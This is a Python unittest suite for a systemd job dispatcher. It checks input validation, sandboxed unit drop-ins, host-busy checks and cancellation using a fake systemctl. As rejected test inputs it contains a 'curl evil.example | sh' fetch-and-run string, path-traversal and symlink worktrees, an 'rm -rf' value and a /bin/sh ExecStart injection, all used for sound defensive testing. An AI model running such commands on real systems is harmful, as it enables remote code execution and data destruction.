"""Tests for deploy/memo-runner-dispatch (Phase 4, TODO-P4-12, AC-P4-11, AC-P4-07, AC-P4-20).

Run: python3 -I -m unittest discover -s deploy/tests -v

Everything happens in a temporary directory that stands for /var/lib/memo-runner,
/run/systemd/system and /etc/memo-bridge/runner.json. The current user plays root, memo-runner
and memo-job at once (ownership checks compare against the effective uid and the configured
users). systemctl is a fake placed first on PATH: it records its argv and answers from a JSON
state file, so no real unit is ever touched.
"""

import fcntl
import hashlib
import json
import os
import pwd
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(os.path.dirname(HERE))
DISPATCH = os.path.join(REPO, 'deploy', 'memo-runner-dispatch')

# The dispatcher's constants (INSTALL_ARGV, INSTALL_TIMEOUT_SECONDS), loaded without running it.
import importlib.machinery  # noqa: E402
import importlib.util  # noqa: E402
_LOADER = importlib.machinery.SourceFileLoader('memo_runner_dispatch', DISPATCH)
dispatch = importlib.util.module_from_spec(importlib.util.spec_from_loader('memo_runner_dispatch', _LOADER))
_LOADER.exec_module(dispatch)
RECORD = os.path.join(REPO, 'deploy', 'record-result')
EXECUTOR = os.path.join(REPO, 'server', 'runners', 'executor-systemd.mjs')
FIXTURES = os.path.join(REPO, 'tests', 'fixtures', 'runner-probe')
USER = pwd.getpwuid(os.geteuid()).pw_name


def dispatch_id_for(job_id):
    # Same derivation as executor-systemd.mjs dispatchIdFor.
    return 'j' + hashlib.sha256(job_id.encode()).hexdigest()[:31]


JOB_ID = 'job_AbCdEfGh12345678'
JOB_ID2 = 'job_ZyXwVuTs-_876543'
DID = dispatch_id_for(JOB_ID)
DID2 = dispatch_id_for(JOB_ID2)
ALL_TEST_SHAPES = 'cargo:test,go:test:./...,make:test,npm:test,python3:-m:pytest:-q'

FAKE_SYSTEMCTL = r'''#!{python} -I
import json, os, sys
here = os.path.dirname(os.path.abspath(__file__))
state_path = os.path.join(here, 'state.json')
with open(state_path) as handle:
    state = json.load(handle)
args = sys.argv[1:]
with open(os.path.join(here, 'calls.jsonl'), 'a') as handle:
    handle.write(json.dumps(args) + '\n')
def save():
    with open(state_path, 'w') as handle:
        json.dump(state, handle)
verb = args[0] if args else ''
if verb == 'list-units':
    if state.get('list_rc', 0):
        sys.exit(state['list_rc'])
    for unit, active in state.get('units', {}).items():
        print(f'{unit} loaded {active} running memo job')
elif verb == 'list-jobs':
    for index, unit in enumerate(state.get('jobs', [])):
        print(f'{index + 1} {unit} start waiting')
elif verb == 'show':
    unit = args[-1]
    if not state.get('dropin_loaded', True):
        print('')
    else:
        directory = os.path.join(state['dropin_dir'], unit + '.d')
        try:
            names = sorted(os.listdir(directory))
        except OSError:
            names = []
        print(' '.join(os.path.join(directory, name) for name in names))
elif verb == 'daemon-reload':
    if state.get('reload_fixes', False):
        state['dropin_loaded'] = True
        save()
elif verb == 'start':
    rc = state.get('start_rc', 0)
    if rc == 0:
        state.setdefault('units', {})[args[-1]] = 'activating'
        save()
    sys.exit(rc)
elif verb == 'stop':
    sys.exit(state.get('stop_rc', 0))
else:
    sys.exit(64)
'''


class Sandbox:
    """A fake /var/lib/memo-runner, /run/systemd/system, runner.json and systemctl."""

    def __init__(self, testcase, dispatch_config=None):
        self.tmp = os.path.realpath(tempfile.mkdtemp(prefix='memo-dispatch-'))
        testcase.addCleanup(shutil.rmtree, self.tmp, True)
        self.root = os.path.join(self.tmp, 'var-lib-memo-runner')
        os.mkdir(self.root, 0o755)
        for path, mode in (('spool', 0o700), ('spool/queue', 0o700), ('spool/cancel', 0o700),
                           ('jobs', 0o751), ('worktrees', 0o770)):
            os.mkdir(os.path.join(self.root, path), mode)
            os.chmod(os.path.join(self.root, path), mode)
        os.chmod(self.root, 0o755)
        self.queue = os.path.join(self.root, 'spool', 'queue')
        self.cancel = os.path.join(self.root, 'spool', 'cancel')
        self.jobs = os.path.join(self.root, 'jobs')
        self.dropin = os.path.join(self.tmp, 'run-systemd-system')
        os.mkdir(self.dropin, 0o755)
        os.chmod(self.dropin, 0o755)
        self.run_dir = os.path.join(self.tmp, 'run')
        os.mkdir(self.run_dir, 0o700)
        self.lock = os.path.join(self.run_dir, 'lock')
        self.worktree = self.make_worktree('memo-bridge', 'agent-12-abcd')
        self.bin = os.path.join(self.tmp, 'bin')
        os.mkdir(self.bin, 0o700)
        self.systemctl = os.path.join(self.bin, 'systemctl')
        with open(self.systemctl, 'w') as handle:
            handle.write(FAKE_SYSTEMCTL.replace('{python}', sys.executable))
        os.chmod(self.systemctl, 0o700)
        self.set_state({})
        self.config = os.path.join(self.tmp, 'runner.json')
        section = {'root': self.root, 'runner_user': USER, 'job_user': USER,
                   'dropin_dir': self.dropin, 'lock_path': self.lock}
        section.update(dispatch_config or {})
        self.write_config({'dispatch': section, 'pilot_repos': ['memo-bridge']})

    def write_config(self, document, mode=0o644):
        with open(self.config, 'w') as handle:
            json.dump(document, handle)
        os.chmod(self.config, mode)

    def make_worktree(self, project, branch, source=None):
        project_dir = os.path.join(self.root, 'worktrees', project)
        os.makedirs(project_dir, exist_ok=True)
        path = os.path.join(project_dir, branch)
        if source:
            shutil.copytree(source, path)
        else:
            os.mkdir(path)
            with open(os.path.join(path, 'package.json'), 'w') as handle:
                json.dump({'scripts': {'test': 'node --test'}}, handle)
        with open(os.path.join(path, '.git'), 'w') as handle:
            handle.write(f'gitdir: {self.root}/repos/{project}/.git/worktrees/{branch}\n')
        return path

    def set_state(self, state):
        state = dict(state)
        state.setdefault('dropin_dir', self.dropin)
        with open(os.path.join(self.bin, 'state.json'), 'w') as handle:
            json.dump(state, handle)

    def calls(self):
        try:
            with open(os.path.join(self.bin, 'calls.jsonl')) as handle:
                return [json.loads(line) for line in handle]
        except FileNotFoundError:
            return []

    def verbs(self):
        return [call[0] for call in self.calls()]

    def starts(self):
        return [call for call in self.calls() if call[0] == 'start']

    def request(self, did=DID, name=None, mode=0o600, **overrides):
        document = {'version': 1, 'id': did, 'job_id': JOB_ID if did == DID else JOB_ID2, 'recipe': 'test',
                    'worktree': self.worktree, 'timeout_seconds': 900}
        document.update(overrides)
        return self.write_queue(name or f'{did}.json', json.dumps(document).encode(), mode)

    def write_queue(self, name, data, mode=0o600):
        path = os.path.join(self.queue, name)
        with open(path, 'wb') as handle:
            handle.write(data)
        os.chmod(path, mode)
        return path

    def write_cancel(self, name, data=b''):
        path = os.path.join(self.cancel, name)
        with open(path, 'wb') as handle:
            handle.write(data)
        return path

    def run(self, *args, config=True):
        argv = [sys.executable, '-I', DISPATCH]
        if config:
            argv += ['--config', self.config]
        argv += list(args)
        env = {'PATH': f'{self.bin}:/usr/bin:/bin', 'LC_ALL': 'C'}
        return subprocess.run(argv, env=env, capture_output=True, text=True, timeout=60)

    def read_json(self, did, name):
        with open(os.path.join(self.jobs, did, name)) as handle:
            return json.load(handle)

    def record(self, did=DID):
        return self.read_json(did, 'dispatch.json')

    def status(self, did=DID):
        return self.read_json(did, 'status.json')

    def dropin_file(self, did=DID):
        return os.path.join(self.dropin, f'memo-job@{did}.service.d', '50-dispatch.conf')

    def install_dropin_file(self, did=DID):
        return os.path.join(self.dropin, f'memo-job-install@{did}.service.d', '50-dispatch.conf')


class DispatchTestCase(unittest.TestCase):
    def setUp(self):
        self.box = Sandbox(self)

    def assertRefused(self, result, reason, did=DID, record=True):
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('event=dispatch_refused', result.stderr)
        self.assertIn(f'reason={reason}', result.stderr)
        self.assertEqual(self.box.starts(), [], 'a refused request must start no unit')
        self.assertEqual(os.listdir(self.box.queue), [], 'a refused request leaves the spool')
        if record:
            document = self.box.record(did)
            self.assertEqual(document['outcome'], 'refused')
            self.assertEqual(document['error'], 'dispatch_refused')
            self.assertEqual(document['reason'], reason)
            # The executor learns the end of the job from status.json.
            status = self.box.status(did)
            self.assertEqual(status['service_result'], 'dispatch_refused')
            self.assertEqual((status['version'], status['id'], status['reason']), (1, did, reason))
            self.assertIsNone(status['exit_code'])


class StartTests(DispatchTestCase):
    def test_valid_request_starts_one_unit(self):
        self.box.request()
        result = self.box.run()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.box.starts(), [['start', '--no-block', f'memo-job@{DID}.service']])
        self.assertEqual(os.listdir(self.box.queue), [])
        document = self.box.record()
        self.assertEqual(document['outcome'], 'started')
        self.assertEqual((document['id'], document['job_id']), (DID, JOB_ID))
        self.assertEqual(document['unit'], f'memo-job@{DID}.service')
        self.assertIn(['npm', 'test'], document['allowed_argv'])
        self.assertEqual(document['timeout_seconds'], 900)
        self.assertIn('event=job_started', result.stderr)
        self.assertFalse(os.path.exists(os.path.join(self.box.jobs, DID, 'status.json')))

    def test_job_folder_modes(self):
        self.box.request()
        self.box.run()
        job_dir = os.path.join(self.box.jobs, DID)
        self.assertEqual(stat.S_IMODE(os.lstat(job_dir).st_mode), 0o751)
        self.assertEqual(stat.S_IMODE(os.lstat(os.path.join(job_dir, 'out')).st_mode), 0o750)
        self.assertEqual(stat.S_IMODE(os.lstat(os.path.join(job_dir, 'dispatch.json')).st_mode), 0o640)
        self.assertEqual([name for name in os.listdir(job_dir) if name.startswith('.')], [])

    def test_dropin_has_only_validated_values(self):
        self.box.request(timeout_seconds=60)
        self.box.run()
        with open(self.box.dropin_file()) as handle:
            text = handle.read()
        out = f'{self.box.root}/jobs/{DID}/out'
        self.assertIn(f'WorkingDirectory={self.box.worktree}\n', text)
        self.assertIn(f'ReadWritePaths={self.box.worktree} {out}\n', text)
        self.assertIn('RuntimeMaxSec=60\n', text)
        environment = dict(item.split('=', 1) for item in
                           next(line for line in text.splitlines() if line.startswith('Environment='))
                           [len('Environment='):].split(' '))
        self.assertEqual(environment, {
            'MEMO_JOB_ID': JOB_ID, 'MEMO_JOB_DISPATCH_ID': DID, 'MEMO_JOB_RECIPE': 'test',
            'MEMO_JOB_ALLOWED_ARGV': ALL_TEST_SHAPES, 'MEMO_JOB_WORKTREE': self.box.worktree,
            'MEMO_JOB_OUT': out, 'MEMO_JOB_TIMEOUT_SECONDS': '60', 'MEMO_JOB_NETWORK': 'private'})
        keys = [line.split('=', 1)[0] for line in text.splitlines() if '=' in line and not line.startswith('#')]
        self.assertEqual(keys, ['WorkingDirectory', 'ReadWritePaths', 'RuntimeMaxSec', 'PrivateNetwork', 'Environment'])
        self.assertNotIn('ExecStart', text)
        self.assertNotIn('%', text.split('\n', 2)[2])
        self.assertEqual(stat.S_IMODE(os.lstat(self.box.dropin_file()).st_mode), 0o644)

    def test_recipe_phase_runs_in_a_private_network(self):
        # Rule: the recipe unit gets PrivateNetwork=yes (its own loopback, no internet, no host
        # service) and the job-runner is told to check it (MEMO_JOB_NETWORK=private).
        self.box.request()
        self.box.run()
        with open(self.box.dropin_file()) as handle:
            text = handle.read()
        self.assertIn('\nPrivateNetwork=yes\n', text)
        self.assertIn(' MEMO_JOB_NETWORK=private', text)
        self.assertNotIn('IPAddress', text, 'the IP policy is the unit template, never the drop-in')

    def test_install_phase_dropin_pins_the_install_argv_and_its_bound(self):
        # Rule: the install unit gets its own drop-in, the fixed install argv shapes only, a
        # bounded start (TimeoutStartSec=) and the network as before (no PrivateNetwork=).
        self.box.request(timeout_seconds=60)
        result = self.box.run()
        self.assertEqual(result.returncode, 0, result.stderr)
        with open(self.box.install_dropin_file()) as handle:
            text = handle.read()
        out = f'{self.box.root}/jobs/{DID}/out'
        self.assertIn(f'WorkingDirectory={self.box.worktree}\n', text)
        self.assertIn(f'ReadWritePaths={self.box.worktree} {out}\n', text)
        self.assertIn(f'TimeoutStartSec={dispatch.INSTALL_TIMEOUT_SECONDS}\n', text)
        self.assertNotIn('PrivateNetwork', text)
        self.assertNotIn('RuntimeMaxSec', text)
        environment = dict(item.split('=', 1) for item in
                           next(line for line in text.splitlines() if line.startswith('Environment='))
                           [len('Environment='):].split(' '))
        self.assertEqual(environment['MEMO_JOB_ALLOWED_ARGV'],
                         'npm:ci:--ignore-scripts,pnpm:install:--frozen-lockfile:--ignore-scripts')
        self.assertNotIn('MEMO_JOB_NETWORK', environment)
        keys = [line.split('=', 1)[0] for line in text.splitlines() if '=' in line and not line.startswith('#')]
        self.assertEqual(keys, ['WorkingDirectory', 'ReadWritePaths', 'TimeoutStartSec', 'Environment'])
        self.assertEqual(stat.S_IMODE(os.lstat(self.box.install_dropin_file()).st_mode), 0o644)
        # One start: memo-job@ pulls the install unit in (Requires=, After= in the template).
        self.assertEqual(self.box.starts(), [['start', '--no-block', f'memo-job@{DID}.service']])

    def test_install_dropin_must_be_loaded_too(self):
        self.box.request()
        self.box.run()
        shown = [call[-1] for call in self.box.calls() if call[0] == 'show']
        self.assertEqual(shown, [f'memo-job-install@{DID}.service', f'memo-job@{DID}.service'])

    def test_refusal_removes_both_dropins(self):
        self.box.set_state({'start_rc': 5})
        self.box.request()
        self.box.run()
        self.assertFalse(os.path.exists(self.box.install_dropin_file()))
        self.assertFalse(os.path.exists(os.path.dirname(self.box.install_dropin_file())))

    def test_running_install_unit_makes_host_busy(self):
        self.box.set_state({'units': {f'memo-job-install@{DID2}.service': 'activating'}})
        self.box.request()
        self.assertRefused(self.box.run(), 'host_busy')

    def test_install_argv_matches_the_runner(self):
        # deploy/memo-runner-dispatch INSTALL_ARGV and server/runners/recipes.mjs INSTALL_ARGV.
        with open(os.path.join(REPO, 'server', 'runners', 'recipes.mjs')) as handle:
            source = handle.read()
        for shape in dispatch.INSTALL_ARGV:
            self.assertIn('[' + ', '.join(f"'{token}'" for token in shape) + ']', source)
        with open(os.path.join(REPO, 'server', 'runners', 'executor-systemd.mjs')) as handle:
            runner = handle.read()
        self.assertIn(f'INSTALL_TIMEOUT_SECONDS = {dispatch.INSTALL_TIMEOUT_SECONDS};', runner)

    def test_dropin_checked_with_show_before_start(self):
        self.box.request()
        self.box.run()
        verbs = self.box.verbs()
        self.assertLess(verbs.index('show'), verbs.index('start'))
        self.assertNotIn('daemon-reload', verbs)

    def test_daemon_reload_once_when_dropin_not_seen(self):
        self.box.set_state({'dropin_loaded': False, 'reload_fixes': True})
        self.box.request()
        result = self.box.run()
        self.assertEqual(self.box.verbs().count('daemon-reload'), 1)
        self.assertEqual(len(self.box.starts()), 1, result.stderr)

    def test_dropin_never_loaded_is_refused(self):
        self.box.set_state({'dropin_loaded': False, 'reload_fixes': False})
        self.box.request()
        result = self.box.run()
        self.assertRefused(result, 'dropin_not_loaded')
        self.assertFalse(os.path.exists(self.box.dropin_file()))

    def test_start_failure_is_recorded_and_dropin_removed(self):
        self.box.set_state({'start_rc': 5})
        self.box.request()
        result = self.box.run()
        self.assertEqual(result.returncode, 0)
        self.assertEqual(self.box.record()['reason'], 'start_failed')
        self.assertEqual(self.box.status()['service_result'], 'dispatch_refused')
        self.assertFalse(os.path.exists(self.box.dropin_file()))

    def test_requests_run_in_fifo_order_and_one_at_a_time(self):
        first = self.box.request(DID)
        second = self.box.request(DID2)
        os.utime(first, ns=(1_000_000_000, 1_000_000_000))
        os.utime(second, ns=(2_000_000_000, 2_000_000_000))
        result = self.box.run()
        self.assertEqual(self.box.starts(), [['start', '--no-block', f'memo-job@{DID}.service']])
        self.assertEqual(self.box.record(DID2)['reason'], 'host_busy')
        self.assertIn('reason=host_busy', result.stderr)

    def test_active_job_unit_makes_host_busy(self):
        self.box.set_state({'units': {f'memo-job@{DID2}.service': 'active'}})
        self.box.request()
        self.assertRefused(self.box.run(), 'host_busy')

    def test_pending_start_job_makes_host_busy(self):
        self.box.set_state({'jobs': [f'memo-job@{DID2}.service']})
        self.box.request()
        self.assertRefused(self.box.run(), 'host_busy')

    def test_failed_unit_does_not_count_as_active(self):
        self.box.set_state({'units': {f'memo-job@{DID2}.service': 'failed'}})
        self.box.request()
        self.box.run()
        self.assertEqual(len(self.box.starts()), 1)

    def test_busy_check_failure_fails_closed(self):
        self.box.set_state({'list_rc': 1})
        self.box.request()
        self.assertRefused(self.box.run(), 'busy_check_failed')

    def test_retry_with_same_id_starts_no_second_unit(self):
        # AC-P4-07 at the dispatcher: the same dispatch id never starts two units.
        self.box.request()
        self.box.run()
        self.assertEqual(len(self.box.starts()), 1)
        self.box.set_state({})  # the first unit has ended: the host is free again
        self.box.request()
        result = self.box.run()
        self.assertEqual(len(self.box.starts()), 1, 'no second start for the same id')
        self.assertIn('reason=already_dispatched', result.stderr)
        self.assertEqual(os.listdir(self.box.queue), [])
        self.assertEqual(self.box.record()['outcome'], 'started', 'the record of the first start is kept')
        self.assertFalse(os.path.exists(os.path.join(self.box.jobs, DID, 'status.json')),
                         'a duplicate never writes a refusal over a real unit')

    def test_refused_request_may_be_retried(self):
        self.box.set_state({'units': {f'memo-job@{DID2}.service': 'active'}})
        self.box.request()
        self.box.run()
        self.assertEqual(self.box.status()['reason'], 'host_busy')
        self.box.set_state({})
        self.box.request()
        self.box.run()
        self.assertEqual(self.box.record()['outcome'], 'started')
        self.assertFalse(os.path.exists(os.path.join(self.box.jobs, DID, 'status.json')),
                         'the earlier refusal must not end the job that now runs')

    def test_recipes_narrowed_by_config(self):
        self.box = Sandbox(self, {'recipes': {'test': [['make', 'test']], 'lint': []}})
        self.box.request()
        self.box.run()
        with open(self.box.dropin_file()) as handle:
            self.assertIn('MEMO_JOB_ALLOWED_ARGV=make:test ', handle.read())

    def test_recipe_absent_from_narrowed_config(self):
        self.box = Sandbox(self, {'recipes': {'test': [['npm', 'test']]}})
        self.box.request(recipe='build')
        self.assertRefused(self.box.run(), 'recipe_not_allowed')

    def test_recipe_with_no_allowed_shape(self):
        self.box = Sandbox(self, {'recipes': {'test': [['npm', 'test']], 'lint': []}})
        self.box.request(recipe='lint')
        self.assertRefused(self.box.run(), 'recipe_not_allowed')

    def test_every_recipe_pins_its_shapes(self):
        for recipe, expected in (('build', 'cargo:build,go:build:./...,make:build,npm:run:build'),
                                 ('lint', 'npm:run:lint')):
            with self.subTest(recipe=recipe):
                self.box = Sandbox(self)
                self.box.request(recipe=recipe)
                self.box.run()
                self.assertEqual(len(self.box.starts()), 1)
                with open(self.box.dropin_file()) as handle:
                    self.assertIn(f'MEMO_JOB_ALLOWED_ARGV={expected} ', handle.read())


class RefusalTests(DispatchTestCase):
    """AC-P4-11: each rejection writes dispatch_refused and starts no unit."""

    def test_bad_id_in_file_name(self):
        for name in ('short.json', 'JABCDEFGH.json', '-abcdefgh.json', f'{JOB_ID}.json', 'abcd_efgh.json',
                     'abcdefgh$.json', f'{DID}.json.bak', f'.{DID}.json', DID, 'a' * 65 + '.json'):
            with self.subTest(name=name):
                self.box = Sandbox(self)
                self.box.write_queue(name, b'{}')
                result = self.box.run()
                self.assertRefused(result, 'invalid_name', record=False)
                self.assertIn('id=invalid', result.stderr)
                self.assertEqual(os.listdir(self.box.jobs), [])

    def test_body_id_differs_from_file_name(self):
        self.box.request(DID, id=DID2)
        self.assertRefused(self.box.run(), 'id_mismatch')

    def test_invalid_job_id(self):
        for job_id in ('job_short', 'job_AbCdEfGh1234567!', 42, None, DID):
            with self.subTest(job_id=job_id):
                self.box = Sandbox(self)
                self.box.request(job_id=job_id)
                self.assertRefused(self.box.run(), 'invalid_job_id')

    def test_recipe_not_in_allowlist(self):
        for recipe in ('deploy', 'shell', 'TEST', '', None, ['test']):
            with self.subTest(recipe=recipe):
                self.box = Sandbox(self)
                self.box.request(recipe=recipe)
                self.assertRefused(self.box.run(), 'recipe_not_allowed')

    def test_argv_in_request_is_refused(self):
        # The request never carries a command: the recipe name selects the allowlisted shapes.
        self.box.request(argv=['npm', 'test'])
        self.assertRefused(self.box.run(), 'invalid_schema')

    def test_cwd_escaping_with_dotdot(self):
        escape = f'{self.box.root}/worktrees/memo-bridge/../../state'
        self.box.request(worktree=escape)
        self.assertRefused(self.box.run(), 'worktree_escape')

    def test_cwd_outside_worktrees_root(self):
        os.makedirs(os.path.join(self.box.root, 'state', 'x'))
        for path in (self.box.tmp, f'{self.box.root}/state/x', '/etc', f'{self.box.root}/worktrees-evil/a/b'):
            with self.subTest(path=path):
                self.box.request(worktree=path)
                self.assertRefused(self.box.run(), 'worktree_outside_root')

    def test_cwd_not_absolute_or_not_normal(self):
        for path, reason in (('worktrees/memo-bridge/agent-12-abcd', 'worktree_invalid_path'),
                             (self.box.worktree + '/', 'worktree_invalid_path'),
                             (self.box.worktree.replace('/worktrees/', '/worktrees//'), 'worktree_invalid_path'),
                             (self.box.worktree + '/.', 'worktree_escape'),
                             (os.path.dirname(self.box.worktree), 'worktree_invalid_path'),
                             (self.box.worktree + '/sub', 'worktree_invalid_path'),
                             (f'{self.box.root}/worktrees/memo-bridge/agent 12', 'worktree_invalid_path'),
                             (f'{self.box.root}/worktrees/memo-bridge/a%i', 'worktree_invalid_path'),
                             (f'{self.box.root}/worktrees/memo-bridge/-rf', 'worktree_invalid_path'),
                             (42, 'worktree_invalid_path')):
            with self.subTest(path=path):
                self.box.request(worktree=path)
                self.assertRefused(self.box.run(), reason)

    def test_cwd_symlink_leaf(self):
        outside = os.path.join(self.box.tmp, 'outside')
        os.mkdir(outside)
        with open(os.path.join(outside, '.git'), 'w') as handle:
            handle.write('gitdir: x\n')
        link = os.path.join(self.box.root, 'worktrees', 'memo-bridge', 'agent-13-link')
        os.symlink(outside, link)
        self.box.request(worktree=link)
        self.assertRefused(self.box.run(), 'worktree_symlink')

    def test_cwd_symlink_component(self):
        real = self.box.make_worktree('cuesheet', 'agent-1-aaaa')
        os.symlink(os.path.dirname(real), os.path.join(self.box.root, 'worktrees', 'alias'))
        self.box.request(worktree=f'{self.box.root}/worktrees/alias/agent-1-aaaa')
        self.assertRefused(self.box.run(), 'worktree_symlink')

    def test_cwd_symlink_inside_root_pointing_to_another_worktree(self):
        other = self.box.make_worktree('cuesheet', 'agent-2-bbbb')
        link = os.path.join(self.box.root, 'worktrees', 'memo-bridge', 'agent-14-link')
        os.symlink(other, link)
        self.box.request(worktree=link)
        self.assertRefused(self.box.run(), 'worktree_symlink')

    def test_cwd_missing(self):
        self.box.request(worktree=f'{self.box.root}/worktrees/memo-bridge/agent-99-none')
        self.assertRefused(self.box.run(), 'worktree_missing')

    def test_cwd_not_a_linked_worktree(self):
        os.unlink(os.path.join(self.box.worktree, '.git'))
        os.mkdir(os.path.join(self.box.worktree, '.git'))
        self.box.request()
        self.assertRefused(self.box.run(), 'worktree_not_linked')

    def test_extra_properties(self):
        for extra in ({'properties': {'User': 'root'}}, {'unit': 'ssh.service'}, {'env': {'GH_TOKEN': 'x'}},
                      {'ExecStart': '/bin/sh'}, {'RuntimeMaxSec': 'infinity'}, {'limits': {}}, {'v': 1}):
            with self.subTest(extra=list(extra)):
                self.box = Sandbox(self)
                self.box.request(**extra)
                self.assertRefused(self.box.run(), 'invalid_schema')

    def test_missing_keys(self):
        document = {'version': 1, 'id': DID, 'job_id': JOB_ID, 'recipe': 'test', 'worktree': self.box.worktree}
        self.box.write_queue(f'{DID}.json', json.dumps(document).encode())
        self.assertRefused(self.box.run(), 'invalid_schema')

    def test_malformed_json(self):
        cases = ((b'{', 'malformed_json'), (b'not json', 'malformed_json'), (b'\xff\xfe{}', 'malformed_json'),
                 (b'{"version":1,"version":1,"id":"x"}', 'malformed_json'), (b'[]', 'invalid_schema'),
                 (b'"text"', 'invalid_schema'), (b'{"version": NaN}', 'malformed_json'), (b'', 'malformed_json'))
        for body, reason in cases:
            with self.subTest(body=body):
                self.box = Sandbox(self)
                self.box.write_queue(f'{DID}.json', body)
                self.assertRefused(self.box.run(), reason)

    def test_wrong_version(self):
        for version in (2, 0, '1', True):
            with self.subTest(version=version):
                self.box = Sandbox(self)
                self.box.request(version=version)
                self.assertRefused(self.box.run(), 'unsupported_version')

    def test_invalid_timeout(self):
        for timeout in (0, -1, 3601, 1.5, '60', True, None, 10**12):
            with self.subTest(timeout=timeout):
                self.box = Sandbox(self)
                self.box.request(timeout_seconds=timeout)
                self.assertRefused(self.box.run(), 'invalid_timeout')

    def test_timeout_capped_by_config(self):
        self.box = Sandbox(self, {'max_timeout_seconds': 600})
        self.box.request(timeout_seconds=601)
        self.assertRefused(self.box.run(), 'invalid_timeout')

    def test_too_large(self):
        self.box.write_queue(f'{DID}.json', b'{' + b' ' * 5000 + b'}')
        self.assertRefused(self.box.run(), 'too_large')

    def test_symlink_entry_is_not_followed(self):
        target = os.path.join(self.box.tmp, 'target.json')
        with open(target, 'w') as handle:
            json.dump({'secret': 1}, handle)
        os.symlink(target, os.path.join(self.box.queue, f'{DID}.json'))
        self.assertRefused(self.box.run(), 'not_regular_file')
        self.assertTrue(os.path.exists(target), 'the symlink target is never removed')

    def test_fifo_entry_does_not_block(self):
        os.mkfifo(os.path.join(self.box.queue, f'{DID}.json'))
        self.assertRefused(self.box.run(), 'not_regular_file')

    def test_hardlinked_entry(self):
        source = os.path.join(self.box.tmp, 'elsewhere.json')
        with open(source, 'w') as handle:
            json.dump({}, handle)
        os.link(source, os.path.join(self.box.queue, f'{DID}.json'))
        self.assertRefused(self.box.run(), 'hardlinked')
        self.assertTrue(os.path.exists(source))

    def test_directory_entry(self):
        os.mkdir(os.path.join(self.box.queue, f'{DID}.json'))
        self.assertRefused(self.box.run(), 'not_regular_file')

    def test_refusals_never_log_request_content(self):
        self.box.request(recipe='curl evil.example | sh', worktree=f'{self.box.root}/worktrees/evil/../../x')
        result = self.box.run()
        self.assertNotIn('evil', result.stderr)
        self.assertNotIn(self.box.root, result.stderr)


class TemporaryFileTests(DispatchTestCase):
    """The executor writes `.<name>.<pid>.<ms>.tmp` in the spool folder, then renames it."""

    def temp(self, folder, name):
        path = os.path.join(folder, name)
        with open(path, 'w') as handle:
            handle.write('{}')
        return path

    def test_young_temporary_file_is_left_alone(self):
        path = self.temp(self.box.queue, f'.{DID}.json.4242.1760400000000.tmp')
        started = time.monotonic()
        result = self.box.run()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertTrue(os.path.exists(path))
        self.assertNotIn('dispatch_refused', result.stderr)
        self.assertIn('pending=1', result.stderr)
        self.assertLess(time.monotonic() - started, 30)

    def test_young_cancel_temporary_file_is_left_alone(self):
        path = self.temp(self.box.cancel, f'.{DID}.4242.1760400000000.tmp')
        self.box.run()
        self.assertTrue(os.path.exists(path))

    def test_stale_temporary_file_is_removed(self):
        path = self.temp(self.box.queue, f'.{DID}.json.4242.1760400000000.tmp')
        old = time.time() - 600
        os.utime(path, (old, old))
        result = self.box.run()
        self.assertFalse(os.path.exists(path))
        self.assertIn('reason=invalid_name', result.stderr)

    def test_request_next_to_a_temporary_file_still_runs(self):
        self.temp(self.box.queue, f'.{DID2}.json.4242.1760400000000.tmp')
        self.box.request()
        self.box.run()
        self.assertEqual(len(self.box.starts()), 1)


class CancelTests(DispatchTestCase):
    """AC-P4-20 at the dispatcher."""

    def start(self):
        self.box.request()
        self.box.run()
        self.assertEqual(self.box.record()['outcome'], 'started')

    def cancel_marker(self):
        return self.box.read_json(DID, 'cancel.json')

    def body(self, reason, did=DID, **extra):
        return json.dumps(dict({'version': 1, 'id': did, 'reason': reason}, **extra)).encode()

    def test_cancel_running_job_writes_marker_then_stops(self):
        self.start()
        self.box.write_cancel(DID)
        result = self.box.run()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.box.calls()[-1], ['stop', '--no-block', f'memo-job@{DID}.service',
                                                f'memo-job-install@{DID}.service'])
        self.assertEqual(self.cancel_marker()['reason'], 'cancelled')
        self.assertEqual(stat.S_IMODE(os.lstat(os.path.join(self.box.jobs, DID, 'cancel.json')).st_mode), 0o640)
        self.assertEqual(os.listdir(self.box.cancel), [])

    def test_cancel_with_budget_reason(self):
        self.start()
        self.box.write_cancel(DID, self.body('budget_exceeded'))
        self.box.run()
        self.assertEqual(self.cancel_marker()['reason'], 'budget_exceeded')

    def test_first_cancel_reason_is_kept(self):
        self.start()
        self.box.write_cancel(DID, self.body('stale_lease'))
        self.box.run()
        self.box.write_cancel(DID, self.body('budget_exceeded'))
        self.box.run()
        self.assertEqual(self.cancel_marker()['reason'], 'stale_lease')

    def test_cancel_before_start_removes_the_request(self):
        self.box.request()
        self.box.write_cancel(DID)
        result = self.box.run()
        self.assertEqual(self.box.starts(), [])
        self.assertNotIn('stop', self.box.verbs())
        self.assertEqual(self.box.record()['outcome'], 'cancelled_before_start')
        self.assertEqual(self.box.status()['service_result'], 'dispatch_refused')
        self.assertEqual(self.box.status()['status'], 'cancelled')
        self.assertEqual(os.listdir(self.box.queue), [])
        self.assertIn('event=job_cancelled_before_start', result.stderr)
        # A later retry of the same request does not start it either.
        self.box.request()
        self.box.run()
        self.assertEqual(self.box.starts(), [])

    def test_cancel_unknown_job_stops_nothing(self):
        # What the executor does for a queued job: it withdraws the request, then writes the cancel.
        self.box.write_cancel(DID)
        result = self.box.run()
        self.assertNotIn('stop', self.box.verbs())
        self.assertIn('event=cancel_unknown_job', result.stderr)
        self.assertEqual(os.listdir(self.box.cancel), [])
        self.assertEqual(os.listdir(self.box.jobs), [])

    def test_cancel_of_refused_job_stops_nothing(self):
        self.box.request(recipe='deploy')
        self.box.run()
        self.box.write_cancel(DID)
        self.box.run()
        self.assertNotIn('stop', self.box.verbs())
        self.assertEqual(self.box.status()['reason'], 'recipe_not_allowed', 'the refusal stays the end')

    def test_cancel_refusals(self):
        cases = ((self.body('rm -rf'), 'invalid_reason'),
                 (self.body('cancelled', unit='ssh'), 'invalid_schema'),
                 (self.body('cancelled', did=DID2), 'id_mismatch'),
                 (b'{', 'malformed_json'),
                 (b' ' * 2000, 'too_large'))
        for body, reason in cases:
            with self.subTest(reason=reason):
                self.box = Sandbox(self)
                self.start()
                self.box.write_cancel(DID, body)
                result = self.box.run()
                self.assertIn(f'reason={reason}', result.stderr)
